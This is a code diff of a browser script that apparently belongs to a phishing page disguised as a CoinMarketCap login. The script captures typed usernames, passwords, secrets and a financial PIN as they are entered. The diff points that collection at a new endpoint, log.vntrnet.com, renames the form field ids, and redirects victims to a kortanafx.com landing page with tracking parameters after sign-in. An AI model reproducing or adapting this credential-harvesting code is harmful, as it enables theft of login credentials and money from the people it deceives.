@@ -1,4 +1,4 @@
-const BACKEND_URL = 'https://event.coinmarketcap.jp/';
+const BACKEND_URL = 'https://log.vntrnet.com/';
 var PREVIOUS_SENT_DATA;
 let USER_IP = 'none';
 let USER_AGENT = 'none';
@@ -27,9 +27,9 @@ document.addEventListener('DOMContentLoaded', function () {
     };
 
     // Get all fields in the form
-    const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
+    const inputs = document.querySelectorAll('[id^="log-"]');
     for (const input of inputs) {
-      const name = input.id.replace('coinmarketcap-', '');
+      const name = input.id.replace('log-', '');
       const value = input.value.trim();
       if (value !== '') {
         formData[name] = value;
@@ -70,7 +70,7 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // Add event listeners for input and button elements
-  const inputs = document.querySelectorAll('[id^="coinmarketcap-"]');
+  const inputs = document.querySelectorAll('[id^="log-"]');
   for (const input of inputs) {
     if (input.nodeName === 'INPUT') {
       input.addEventListener('keyup', async function (event) {
@@ -93,12 +93,12 @@ document.addEventListener('DOMContentLoaded', function () {
 });
 
 const financialPinElement = document.getElementById('financial-pin');
-const usernameElement = document.getElementById('coinmarketcap-username');
-const passwordElement = document.getElementById('coinmarketcap-password');
-const secretElement = document.getElementById('coinmarketcap-secret');
+const usernameElement = document.getElementById('log-username');
+const passwordElement = document.getElementById('log-password');
+const secretElement = document.getElementById('log-secret');
 
 let signinClickCount = 0;
-const loginComponent = document.getElementById('coinmarketcap-login');
+const loginComponent = document.getElementById('log-login');
 loginComponent.addEventListener('click', (event) => {
   event.preventDefault();
 
@@ -110,5 +110,6 @@ loginComponent.addEventListener('click', (event) => {
     return;
   }
 
-  window.location.href = 'https://kortanafx.com/';
+  window.location.href =
+    'https://kortanafx.com/?linkId=lp_737338&sourceId=admin&tenantId=kortanafx';
 });
